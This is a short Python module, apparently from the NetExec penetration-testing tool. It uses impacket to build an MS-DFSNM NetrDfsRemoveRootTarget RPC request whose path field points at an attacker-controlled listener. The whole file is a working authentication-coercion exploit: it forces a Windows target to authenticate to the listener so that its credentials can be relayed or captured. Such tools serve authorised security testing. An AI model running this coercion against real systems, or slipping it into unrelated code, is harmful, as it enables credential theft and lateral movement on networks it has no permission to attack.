from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import LPWSTR, ULONG, NULL


DCERPCSessionError = __import__("nxc.data.coercer_method.DCERPCSessionError", fromlist=["DCERPCSessionError"]).DCERPCSessionError


class NetrDfsRemoveRootTarget(NDRCALL):
    """
    NET_API_STATUS NetrDfsRemoveRootTarget(
        [in, unique, string] LPWSTR pDfsPath,
        [in, unique, string] LPWSTR pTargetPath,
        [in] ULONG Flags
    );
    """
    opnum = 24
    structure = (
        ("pDfsPath", LPWSTR),  # Type: LPWSTR
        ("pTargetPath", LPWSTR),  # Type: LPWSTR
        ("Flags", ULONG),  # Type: ULONG
    )


class NetrDfsRemoveRootTargetResponse(NDRCALL):
    structure = ()


def request(dce, target, listener):
    request = NetrDfsRemoveRootTarget()
    request["pDfsPath"] = f"\\\\{listener}\\a\x00"
    request["pTargetPath"] = NULL
    request["Flags"] = 0
    dce.request(request)